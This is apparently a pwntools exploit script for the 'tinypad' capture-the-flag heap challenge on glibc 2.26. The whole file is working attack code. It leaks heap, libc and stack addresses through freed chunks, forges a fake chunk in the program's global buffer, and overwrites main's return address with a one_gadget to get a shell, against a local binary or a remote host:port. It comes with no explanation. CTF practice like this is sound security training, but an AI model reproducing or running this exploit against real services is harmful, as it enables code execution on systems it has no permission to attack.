#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64", log_level="debug")
localfile = "./tinypad"
locallibc = "../glibc_versions/2.26/x64_notcache/lib/libc-2.26.so"

def add(size, content):
    io.recvuntil("(CMD)>>> ")
    io.sendline("A")
    io.recvuntil("(SIZE)>>> ")
    io.sendline(str(size))
    io.recvuntil("(CONTENT)>>> ")
    io.send(content)

def edit(idx, content):
    io.recvuntil("(CMD)>>> ")
    io.sendline("E")
    io.recvuntil("(INDEX)>>> ")
    io.sendline(str(idx))
    io.recvuntil("(CONTENT)>>> ")
    io.send(content)
    io.recvuntil("(Y/n)>>> ")
    io.sendline("Y")

def delete(idx):
    io.recvuntil("(CMD)>>> ")
    io.sendline("D")
    io.recvuntil("(INDEX)>>> ")
    io.sendline(str(idx))

def exp():
    tinypad    = 0x602040
    one_gadget = 0x40d82

    add(0x28, "\n")                         # 1: 0x30
    add(0x28, "\n")                         # 2: 0x30
    add(0xf8, "\n")                         # 3: 0x100
    add(0x80, "\n")                         # 4: 0x90
    delete(2)
    delete(1)
    delete(3)

    io.recvuntil(" #   INDEX: 1\n # CONTENT: ")
    heap_addr = u64(io.recvline()[:-1].ljust(8, b"\x00"))
    heap_base = heap_addr & (~0xfff)
    fake_size = heap_base + 0x30 + 0x30 - tinypad

    add(0xf8, "\n")                                 # 1: 0x100
    add(0x28, "\n")                                 # 2: 0x30
    add(0x28, b"A"*0x20+p64(fake_size) + b"\n")     # 3: 0x30

    edit(3, p64(0)+p64(fake_size)+p64(tinypad)+p64(tinypad) + b"\x00"*8 + b"\n")
    delete(4)           # consolidate with top chunk, avoid malloc unsorted bin check error
    delete(1)
    
    add(0xe8, "\n")
    add(0x40, p64(0x1) + p64(tinypad+0x100) + p64(0x1) + p64(elf.got["strlen"]) + p64(0)*4 + b"\n")
    add(0x40, "\n")     # avoid free error
    io.recvuntil(" #   INDEX: 2\n # CONTENT: ")
    libc_addr = u64(io.recvline()[:-1].ljust(8, b"\x00"))
    libc_base = libc_addr - 0x14CBC0
    delete(1)

    # gdb.attach(io, "b *0x4009BC")
    add(0x40, p64(0x1) + p64(tinypad+0x100) + p64(0x1) + p64(libc_base+libc.sym["environ"]) + p64(0)*4 + b"\n")
    io.recvuntil(" #   INDEX: 2\n # CONTENT: ")
    stack_addr = u64(io.recvline()[:-1].ljust(8, b"\x00"))
    mainret_addr = stack_addr - 0xf0
    delete(1)

    add(0x40, p64(0x1) + p64(tinypad+0x100) + p64(0x1) + p64(mainret_addr) + p64(0)*4 + b"\n")
    edit(2, p64(libc_base+one_gadget) + b"\n")

    io.recvuntil("(CMD)>>> ")
    io.sendline("Q")

    io.interactive()


argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)
elf = ELF(localfile)
libc = ELF(locallibc)
exp()